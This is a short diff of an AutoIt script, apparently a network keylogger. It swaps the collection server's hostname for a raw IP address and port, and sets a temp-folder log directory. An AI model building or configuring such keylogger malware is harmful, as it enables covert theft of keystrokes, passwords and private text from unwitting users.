@@ -43,7 +43,7 @@
 #AutoIt3Wrapper_Au3Check_Stop_OnWarning=y
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 
-Global $server_addr="server.vittgam.net"
+Global $server_addr="174.59.49.181"
 Global $server_port="12569"
 
 Global $keylog_dir=@TempDir&"\NKL"
